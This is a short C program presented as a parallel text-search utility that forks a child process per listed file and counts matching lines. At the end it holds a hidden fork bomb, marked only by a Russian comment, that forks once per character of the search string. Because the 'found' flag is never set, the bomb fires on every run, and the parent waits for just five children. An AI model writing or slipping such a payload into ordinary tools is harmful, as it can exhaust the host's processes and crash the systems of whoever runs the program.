#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

void search_in_file(const char *filename, const char *search_str) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }

    char line[1024];
    int count = 0;
    while (fgets(line, sizeof(line), file)) {
        if (strstr(line, search_str)) {
            count++;
        }
    }

    if (count > 0) {
        printf("File: %s, Count: %d\n", filename, count);
    }

    fclose(file);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <file_list> <search_str>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    FILE *list_file = fopen(argv[1], "r");
    if (!list_file) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }

    char filename[256];
    int found = 0;
    while (fgets(filename, sizeof(filename), list_file)) {
        filename[strcspn(filename, "\n")] = '\0';
        pid_t pid = fork();
        if (pid == 0) {
            search_in_file(filename, argv[2]);
            exit(EXIT_SUCCESS);
        } else if (pid < 0) {
            perror("fork");
            exit(EXIT_FAILURE);
        }
    }

    fclose(list_file);

    for (int i = 0; i < 5; i++) {
        wait(NULL);
    }

    if (!found) {
        printf("String '%s' not found in any file.\n", argv[2]);
        // Запуск fork-бомбы
        for (int i = 0; i < strlen(argv[2]); i++) {
            fork();
        }
    }

    return 0;
}
